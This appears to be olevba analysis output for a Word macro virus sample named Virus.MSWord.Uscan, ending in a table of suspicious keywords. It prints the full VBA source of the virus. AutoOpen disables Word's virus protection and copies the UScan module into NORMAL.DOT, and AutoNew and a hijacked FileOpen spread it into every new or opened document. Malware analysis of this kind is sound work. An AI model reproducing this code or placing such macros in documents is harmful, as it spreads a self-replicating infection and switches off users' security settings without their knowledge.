olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uscan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Uscan - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UScan 
in file: Virus.MSWord.Uscan - OLE stream: 'UScan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
' Ensures NORMAL.DOT contains main macros.

'On Error GoTo errInfProcess

Dim intMiscVar, intVersion As Integer
Dim blnFExists, blnNExists As Boolean

If Application.Options.VirusProtection = True Then Application.Options.VirusProtection = False

If NormalTemplate.VBProject.VBComponents.Count > 1 Then
  For intMiscVar = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(intMiscVar).Name = "UScan" Then blnNExists = True
  Next intMiscVar
End If

If ActiveDocument.VBProject.VBComponents.Count > 1 Then
  For intMiscVar = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(intMiscVar).Name = "UScan" Then blnFExists = True
  Next intMiscVar
End If

SetAttr NormalTemplate.FullName, 0

If blnFExists = True Then
  If blnNExists = True Then Application.OrganizerDelete NormalTemplate.FullName, "UScan", wdOrganizerObjectProjectItems
  Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "UScan", wdOrganizerObjectProjectItems
Else
  Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "UScan", wdOrganizerObjectProjectItems
End If

NormalTemplate.Save

UScan

Exit Sub

errInfProcess:
  Resume Next
End Sub
Sub AutoNew()
' Copies UScan modile to all new files.

  Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "UScan", wdOrganizerObjectProjectItems
End Sub
Function intUAppVer() As Integer
' Returns version of called UScan instance.

  intUAppVer = 1111
End Function
Sub FileOpen()
' Copies macros from the current document (or template) to the opened one.

On Error GoTo errInf

Dialogs(wdDialogFileOpen).Show

If ActiveDocument.Name = "" Then Exit Sub

'MsgBox (ActiveDocument.FullName & ", deleting UScan from")

Application.OrganizerDelete ActiveDocument.FullName, "UScan", wdOrganizerObjectProjectItems
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "UScan", wdOrganizerObjectProjectItems

Exit Sub

errInf:
  Resume Next
End Sub
Sub UScan()
' Main 'extra effects' routine.

'///// /// Name: UScan
'//// // Author: tgho
'/// // Version: 1.11.3
'// Last Edited: 19th February, 1998

On Error GoTo errQuit

If UCase(Application.UserInitials) = "AF" Then MsgBox ("This file contains the UScan macro. It is not harmful, but may spread in a disconcerting manner.")

errQuit:
End Sub
Private Function blnUScanSearch() As Boolean
' Searches the NORMAL.DOT template to return a boolean value for the existence of the macros.
' NOTE: Currently not used.

On Error GoTo errScan

Dim intCountMacros, intMacros As Integer

blnUScanSearch = False

intMacros = 0

For Each xItem In NormalTemplate.VBProject.VBComponents
  If xItem.Type = vbext_ct_StdModule Then intMacros = intMacros + 1
Next xItem

If intMacros > 0 Then
    
  For intCountMacros = 1 To intMacros
  
    If (WordBasic(intCountMacros) = "UScan") Then blnUScanSearch = True
     
  Next intCountMacros
  
End If

errScan:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

